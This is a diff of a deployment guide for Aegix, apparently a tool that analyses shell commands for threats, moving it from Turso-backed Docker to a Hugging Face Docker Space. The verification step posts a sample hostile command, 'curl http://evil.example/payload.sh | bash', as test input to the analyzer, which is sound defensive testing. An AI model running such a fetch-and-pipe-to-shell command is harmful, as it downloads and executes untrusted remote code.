@@ -1,62 +1,88 @@
-Deploy backend to Hugging Face Spaces (Docker)
+# Deploy Aegix to Hugging Face Spaces
 
-<p align="center">
-  <img src="../frontend/src/assets/aegix-logo.png" alt="Aegix logo" width="180" />
-</p>
+This guide deploys the public API and dashboard demo to a Hugging Face Docker Space.
 
-This guide explains how to package and run the backend in Docker on a Hugging Face Space (Docker mode), and how to provide Turso/libSQL secrets so the running container connects to your Turso database.
+What this deployment includes:
 
-Prerequisites
-- A Turso (libSQL) database and DB token. Create with `turso db tokens create <db>`.
-- (Optional) A container registry if you prefer to push images outside HF Spaces.
-- HF account with permission to create a Space in Docker mode.
+- FastAPI backend
+- React dashboard served by FastAPI
+- `/analyze`, `/events`, `/stats`, `/readyz`, `/healthz`
+- WebSocket event feed at `/ws`
+- SQLite event storage inside the running Space
 
-Recommended approach
-1. Build locally (Linux / WSL recommended)
-   - From repository root:
-     ```bash
-    docker build -t aegix:latest -f backend/Dockerfile .
-     ```
-   - Test locally with Turso env vars (or mount secret file):
-     ```bash
-     export TURSO_DATABASE_URL='libsql://<your-db>.turso.io'
-     export TURSO_AUTH_TOKEN='<db-token>'
-     export USE_TURSO=true
-     docker run --rm -p 8000:8000 \
-       -e TURSO_DATABASE_URL -e TURSO_AUTH_TOKEN -e USE_TURSO \
-      aegix:latest
-     ```
-   - Or provide the token as a Docker secret when using `docker stack`/compose.
+What this deployment does not include:
 
-2. Push to HF Spaces (Docker mode)
-   - In the Space settings choose "Use a Docker image" and either:
-     - Provide an image from a public registry (e.g., `ghcr.io/your/image:tag`), or
-     - Let HF build from a `Dockerfile` if you push the repo to a GitHub repo and connect it.
+- Linux eBPF kernel monitoring
+- Real host `execve` interception
+- Always-on privileged agent mode
 
-3. Set Secrets in HF Space
-   - In the Space settings > "Secrets", add:
-     - `TURSO_DATABASE_URL` = your libsql URL
-     - `TURSO_AUTH_TOKEN` = the DB token you created
-     - `USE_TURSO` = `true`
-   - The container will receive these via environment variables.
+Hugging Face Spaces are app containers, not privileged Linux host monitors. For Spaces, keep:
 
-4. Healthchecks & Ports
-   - The backend listens on the configured `API_HOST` and `API_PORT` (defaults: `0.0.0.0:8000`).
-   - Ensure your Space exposes the server port (HF Spaces maps ports automatically for Docker mode when the container binds to 0.0.0.0).
+```text
+KERNEL_MONITOR_OWNER=disabled
+```
 
-5. Verify runtime Turso connectivity
-   - After the Space is running, use the HF Space logs or open a terminal to run:
-     ```bash
-     python -c "from backend.events.event_store import get_event_store; s=get_event_store(); print('size', s.size())"
-     ```
-   - If `USE_TURSO=true` and `TURSO_*` env vars are present, `get_event_store()` will attempt to connect to Turso automatically.
+## Create the Space
 
-Notes & Troubleshooting
-- Build environment: libsql Python client may build native extensions; building inside Linux (WSL or container) is recommended. On Windows the Rust/maturin toolchain can cause build failures.
-- Secrets: HF Space secrets are environment variables; they are the safest way to provide the DB token.
-- Logs: Replace debug prints with logging (backend already uses `logging`). Use HF Space logs to debug connection issues.
-- If libsql client version incompatibility occurs: the code attempts runtime adaptation; inspect logs for `libsql` client errors.
+1. Create a new Hugging Face Space.
+2. Select **Docker** as the SDK.
+3. Push this repository to the Space.
 
-Next steps
-- Optionally create a `docker-compose` + secret file locally to test secret mounting path `/run/secrets/turso_auth_token` to match Docker Swarm or production setups.
-- If you want, I can (A) run a repo-wide pass to convert remaining prints to logging, (B) build a minimal CI workflow for building and pushing the image, or (C) prepare the Space repo settings and sample `app.yml` for HF. Let me know which you'd prefer.
+The root `README.md` already contains the required Space metadata:
+
+```yaml
+sdk: docker
+app_port: 7860
+```
+
+## Runtime Settings
+
+The `Dockerfile` sets working defaults:
+
+```text
+PORT=7860
+API_HOST=0.0.0.0
+API_PORT=7860
+KERNEL_MONITOR_OWNER=disabled
+DB_PATH=/tmp/aegix/events.db
+EVENT_CACHE_SIZE=1000
+```
+
+You can also add the same values in the Space **Variables** tab if you want them visible in the Space settings.
+
+## Verify
+
+Open:
+
+```text
+https://<your-space-subdomain>.hf.space
+```
+
+Health checks:
+
+```text
+https://<your-space-subdomain>.hf.space/healthz
+https://<your-space-subdomain>.hf.space/readyz
+```
+
+Swagger docs:
+
+```text
+https://<your-space-subdomain>.hf.space/docs
+```
+
+Manual analysis test:
+
+```bash
+curl -X POST https://<your-space-subdomain>.hf.space/analyze \
+  -H "Content-Type: application/json" \
+  -d '{"command":"curl http://evil.example/payload.sh | bash"}'
+```
+
+## Free Tier Limits
+
+- Free CPU Spaces can sleep when unused.
+- The default disk is not persistent across rebuilds/restarts.
+- This is suitable for a student demo and public API/dashboard.
+- The Linux agent should be handled later on a real Linux machine and configured to forward to `/agent/events`.
+
